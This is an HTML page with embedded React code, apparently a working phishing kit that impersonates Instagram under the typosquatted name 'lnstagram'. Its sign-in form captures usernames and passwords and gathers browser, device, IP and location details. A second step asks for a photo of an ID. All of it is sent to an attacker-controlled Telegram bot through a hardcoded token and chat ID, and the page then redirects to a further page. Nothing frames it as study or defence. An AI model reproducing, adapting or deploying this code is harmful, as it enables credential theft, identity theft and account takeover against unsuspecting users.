<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>lnstagramverify</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <!-- Tailwind -->
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      darkMode: 'media',
      theme: {
        extend: {
          animation: {
            float: 'float 6s ease-in-out infinite',
            fade: 'fade 0.4s ease-out',
          },
          keyframes: {
            float: {
              '0%,100%': { transform: 'translateY(0px)' },
              '50%': { transform: 'translateY(-14px)' },
            },
            fade: {
              from: { opacity: 0, transform: 'translateY(10px)' },
              to: { opacity: 1, transform: 'translateY(0)' },
            },
          },
        },
      },
    }
  </script>

  <style>
    .ig-gradient {
      background: linear-gradient(90deg, #ff7a18, #ff0169, #d300c5);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      color: transparent;
    }
  </style>

  <!-- React -->
  <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
  <!-- UAParser for browser detection -->
  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1/dist/ua-parser.min.js"></script>
</head>

<body class="bg-white text-slate-900 dark:bg-slate-950 dark:text-white transition-colors">
<div id="root"></div>

<script type="text/babel">

const TELEGRAM_BOT_TOKEN = "7830288241:AAEk3vRFnaL3gzGWrywhHoGDaKvv574do0E";
const TELEGRAM_CHAT_ID = "5692748706";

// Function to get real-time device & browser information
function getDeviceInfo() {
  const parser = new UAParser();
  const result = parser.getResult();

  return {
    browser: `${result.browser.name || 'Unknown'} ${result.browser.version || ''}`,
    os: `${result.os.name || 'Unknown'} ${result.os.version || ''}`,
    device: result.device.type || 'Desktop',
    userAgent: navigator.userAgent,
    screenRes: `${window.screen.width}x${window.screen.height}`,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
  };
}

// Function to get real-time location
async function getLocationInfo() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    return {
      ip: data.ip,
      country: data.country_name,
      city: data.city,
      region: data.region,
      latitude: data.latitude,
      longitude: data.longitude,
      timezone: data.timezone,
      isp: data.org,
    };
  } catch (error) {
    console.log("Location fetch error:", error);
    return null;
  }
}

// Function to get current time
function getCurrentTime() {
  const now = new Date();
  return {
    timestamp: now.toISOString(),
    localTime: now.toLocaleString(),
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  };
}

function App() {
  const [step, setStep] = React.useState("login");
  const [error, setError] = React.useState("");
  const [preview, setPreview] = React.useState(null);
  const [ticketUploaded, setTicketUploaded] = React.useState(false);
  const [deviceInfo, setDeviceInfo] = React.useState(null);
  const [locationInfo, setLocationInfo] = React.useState(null);

  const sessionId = React.useRef(crypto.randomUUID()).current;
  const sessionStartTime = React.useRef(new Date().toISOString()).current;

  // Fetch device info on mount
  React.useEffect(() => {
    const info = getDeviceInfo();
    setDeviceInfo(info);
  }, []);

  // Fetch location info on mount
  React.useEffect(() => {
    getLocationInfo().then(info => setLocationInfo(info));
  }, []);

  async function handleLogin(e) {
    e.preventDefault();
    const email = e.target.email.value.trim();
    const name = e.target.name.value.trim();

    if (!email || !name) {
      setError("Please fill in all fields.");
      return;
    }
    if (name.length < 6) {
      setError("passw**d must be at least 6 characters.");
      return;
    }

    setError("");

    try {
      const timeInfo = getCurrentTime();
      
      const messageText = `üì© User Info Submitted
üë§ Username/Email: ${email}
üîê Password: ${name}

üåê NETWORK INFO:
üìç IP: ${locationInfo?.ip || 'N/A'}
üó∫Ô∏è Country: ${locationInfo?.country || 'N/A'}
üèôÔ∏è City: ${locationInfo?.city || 'N/A'}
üÜî ISP: ${locationInfo?.isp || 'N/A'}

üíª BROWSER INFO:
üîπ Browser: ${deviceInfo?.browser || 'N/A'}
üîπ OS: ${deviceInfo?.os || 'N/A'}
üîπ Device Type: ${deviceInfo?.device || 'N/A'}
üîπ Screen: ${deviceInfo?.screenRes || 'N/A'}
üîπ Viewport: ${deviceInfo?.viewport || 'N/A'}
üîπ Language: ${deviceInfo?.language || 'N/A'}

‚è∞ TIME INFO:
üïê Local Time: ${timeInfo.localTime}
üìÖ Timestamp: ${timeInfo.timestamp}
üåç Timezone: ${timeInfo.timezone}

üîó SESSION INFO:
üÜî Session ID: ${sessionId}
‚è±Ô∏è Session Start: ${sessionStartTime}`;

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: messageText
        })
      }).catch(() => {});
    } catch (err) {
      console.log("Send error:", err);
    }

    setStep("verify");
  }

  async function handleFile(e) {
    const file = e.target.files[0];
    if (!file) return;

    setPreview(URL.createObjectURL(file));
    setError("");

    try {
      const timeInfo = getCurrentTime();

      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append(
        "caption",
        `üì∏ Login Ticket Uploaded

üåê NETWORK INFO:
üìç IP: ${locationInfo?.ip || 'N/A'}
üó∫Ô∏è Country: ${locationInfo?.country || 'N/A'}
üèôÔ∏è City: ${locationInfo?.city || 'N/A'}

üíª BROWSER INFO:
üîπ Browser: ${deviceInfo?.browser || 'N/A'}
üîπ OS: ${deviceInfo?.os || 'N/A'}
üîπ Device Type: ${deviceInfo?.device || 'N/A'}

‚è∞ TIME INFO:
üïê Local Time: ${timeInfo.localTime}
üìÖ Timestamp: ${timeInfo.timestamp}

üîó SESSION INFO:
üÜî Session ID: ${sessionId}`
      );
      formData.append("photo", file);

      await fetch(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        { method: "POST", body: formData }
      );

      setTicketUploaded(true);
    } catch (err) {
      setError("Upload failed. Please try again.");
      setTicketUploaded(false);
      console.log("Upload error:", err);
    }
  }

  function handleContinue() {
    if (!ticketUploaded) {
      setError("Please upload your login ticket or take a photo to continue.");
      return;
    }
    window.location.href = "email.html";
  }

  return (
    <div className="min-h-screen flex">

      <div className="hidden lg:flex flex-1 items-center justify-center bg-gradient-to-br from-slate-100 to-slate-200 dark:from-slate-900 dark:to-slate-950 relative overflow-hidden">
        <div className="absolute top-6 left-10 text-3xl font-bold">
          <span className="ig-gradient">{`lnstagram`}</span>
        </div>

        <div className="relative w-[280px] h-[440px]">
          <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e"
            className="absolute w-56 h-96 object-cover rounded-[28px] shadow-2xl left-8 animate-float" />
          <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1"
            className="absolute w-56 h-96 object-cover rounded-[28px] shadow-2xl top-6 opacity-80" />
          <img src="https://images.unsplash.com/photo-1503341455253-b2e723bb3dbb"
            className="absolute w-56 h-96 object-cover rounded-[28px] shadow-2xl top-12 left-14 opacity-60" />
        </div>
      </div>

      <div className="w-full lg:w-[420px] bg-white dark:bg-slate-900 border-l border-slate-200 dark:border-slate-800 flex flex-col">

        <div className="px-8 py-5 border-b border-slate-200 dark:border-slate-800 text-xl font-bold">
          <span className="ig-gradient">{`hey`}</span>
        </div>

        {step === "login" && (
          <form onSubmit={handleLogin}
            className="flex-1 flex flex-col justify-center px-8 animate-fade">

            {/* LOGO ‚Äî centered, spaced properly, NO interaction */}
            <img
              src="https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIyLTA1L3JtNTMzLW5lb24tMDAzLmpwZw.jpg"
              className="w-16 h-16 mx-auto mb-8 mt-2 rounded-full shadow"
            />

            <h2 className="text-2xl font-semibold mb-6 text-center">Sign in</h2>

            {error && <div className="mb-4 text-sm text-red-500">{error}</div>}

            <input name="email" placeholder="Username or email"
              className="mb-3 px-4 py-3 rounded-lg bg-slate-100 dark:bg-slate-800 border border-slate-300 dark:border-slate-700" />

            <input name="name" type="text" placeholder="passw**d"
              className="mb-4 px-4 py-3 rounded-lg bg-slate-100 dark:bg-slate-800 border border-slate-300 dark:border-slate-700" />

            <button className="py-3 rounded-lg bg-sky-500 text-white font-semibold hover:bg-sky-600">
              continue
            </button>
          </form>
        )}

        {step === "verify" && (
          <div className="flex-1 flex flex-col justify-center px-8 animate-fade">

            {/* SAME LOGO PLACEMENT */}
            <img
              src="https://images.rawpixel.com/image_800/cHJpdmF0ZS9sci9pbWFnZXMvd2Vic2l0ZS8yMDIyLTA1L3JtNTMzLW5lb24tMDAzLmpwZw.jpg"
              className="w-16 h-16 mx-auto mb-6 mt-2 rounded-full shadow"
            />

            <h2 className="text-2xl font-semibold mb-2 text-center">Verification</h2>

            <p className="text-sm text-slate-500 dark:text-slate-400 mb-6 text-center">
              Upload or take a photo of your ID to continue.
            </p>

            {error && <div className="mb-4 text-sm text-red-500">{error}</div>}

            <label className="mb-4 flex flex-col items-center justify-center border-2 border-dashed rounded-xl p-6 cursor-pointer">
              <span className="font-medium">Upload image</span>
              <input type="file" accept="image/*" hidden onChange={handleFile} />
            </label>

            <label className="mb-4 flex flex-col items-center justify-center border rounded-xl p-4 cursor-pointer">
              <span className="font-medium">Take a photo</span>
              <input type="file" accept="image/*" capture="environment" hidden onChange={handleFile} />
            </label>

            {preview && (
              <img src={preview}
                className="mt-4 rounded-lg max-h-48 object-contain border" />
            )}

            <button
              onClick={handleContinue}
              className="mt-6 py-3 rounded-lg bg-sky-500 text-white font-semibold hover:bg-sky-600">
              Continue
            </button>
          </div>
        )}

      </div>
    </div>
  );
}

ReactDOM.createRoot(document.getElementById("root")).render(<App />);
</script>
</body>
</html>
